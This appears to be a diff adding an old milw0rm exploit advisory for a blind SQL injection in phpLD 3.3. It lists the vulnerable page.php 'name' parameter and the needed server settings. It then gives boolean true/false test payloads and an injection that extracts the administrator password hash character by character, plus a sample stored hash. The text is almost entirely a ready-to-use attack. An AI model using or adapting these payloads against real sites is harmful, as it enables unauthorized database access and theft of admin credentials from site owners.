@@ -1,0 +1,26 @@
+phpLD 3.3 Blind SQL Injection
+http://www.phplinkdirectory.com/
+
+magic_quotes_gpc = Off
+register_globals = On
+
+Vulnerable:
+GET http://site/phpld/page.php?name=
+
+True Request:
+(validpagename)' or 1=1#
+
+False Request:
+(validpagename)' or 1=0#
+
+Try this (urlencode):
+(validpagename)' or ORD(MID((SELECT PASSWORD FROM PLD_USER WHERE ID = 1),1,1))>1# etc...
+
+Field value example:
+{sha1}dd94709528bb1c83d08f3088d4043f4742891f4f
+
+
+- Seasons Greetings -
+- http://nukeit.org -
+
+# milw0rm.com [2008-12-23]
